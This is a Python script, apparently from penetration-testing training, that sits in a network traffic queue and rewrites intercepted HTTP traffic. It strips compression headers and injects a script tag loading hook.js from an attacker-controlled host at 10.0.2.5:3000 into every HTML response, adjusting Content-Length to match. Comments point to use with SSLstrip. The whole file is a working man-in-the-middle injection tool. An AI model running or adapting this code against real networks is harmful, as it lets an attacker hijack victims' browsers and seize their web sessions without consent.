#! /usr/bin/env python
# Compatibility: Python 3.x

import netfilterqueue
import scapy.all as scapy
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        load = scapy_packet[scapy.Raw].load.decode(errors="ignore")
        if scapy_packet[scapy.TCP].dport == 80:  # change port to '80' if not using SSLstrip (1000 port for SSL)
            print("[+] Request")
            load = re.sub(r"Accept-Encoding:.*?\r\n", "", load)
            load = load.replace("HTTP/1.1", "HTTP/1.0")

        elif scapy_packet[scapy.TCP].sport == 80:  # change port to '80' if not using SSLstrip (1000 port for SSL)
            print("[+] Response")
            # Tested at: http://vulnweb.com/
            # TODO: make the ip of the server as an argument to argparse.
            injection_code = "<script src=\"http://10.0.2.5:3000/hook.js\"></script>"
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search(r"(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(bytes(new_packet))

    packet.accept()


print("[+] Queue has been created.")
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

# TODO: configure http server on AWS for penetration tests.
